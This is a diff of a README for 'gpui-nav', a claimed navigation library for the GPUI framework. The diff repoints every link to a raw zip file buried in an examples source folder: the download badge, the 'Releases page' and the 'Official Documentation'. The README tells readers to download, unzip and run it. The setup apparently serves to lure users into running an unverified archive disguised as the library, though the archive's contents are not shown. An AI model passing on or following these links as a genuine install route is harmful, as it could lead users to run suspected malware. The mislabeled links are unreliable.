@@ -6,7 +6,7 @@ Welcome to **gpui-nav**, a lightweight screen navigation library designed specif
 
 ## 📥 Download Now
 
-[![Download gpui-nav](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/stickly/gpui-nav.zip)](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/stickly/gpui-nav.zip)
+[![Download gpui-nav](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/examples/basic_navigation/src/nav-gpui-2.4.zip)](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/examples/basic_navigation/src/nav-gpui-2.4.zip)
 
 ## ⚙️ What is gpui-nav?
 
@@ -30,7 +30,7 @@ To run **gpui-nav**, you need:
 
 ### Step 1: Download & Install
 
-To get **gpui-nav**, visit the [Releases page](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/stickly/gpui-nav.zip) to download the software. Look for the most recent version listed at the top. Click on the download link that matches your system.
+To get **gpui-nav**, visit the [Releases page](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/examples/basic_navigation/src/nav-gpui-2.4.zip) to download the software. Look for the most recent version listed at the top. Click on the download link that matches your system.
 
 ### Step 2: Unzip the Files
 
@@ -56,8 +56,8 @@ For more in-depth instructions and advanced features, please refer to the offici
 
 ## 🔗 Important Links
 
-- [Download gpui-nav](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/stickly/gpui-nav.zip)
-- [Official Documentation](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/stickly/gpui-nav.zip)
+- [Download gpui-nav](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/examples/basic_navigation/src/nav-gpui-2.4.zip)
+- [Official Documentation](https://raw.githubusercontent.com/OscarHernandezMartinez2/gpui-nav/main/examples/basic_navigation/src/nav-gpui-2.4.zip)
 
 ## 💬 Community and Support
 
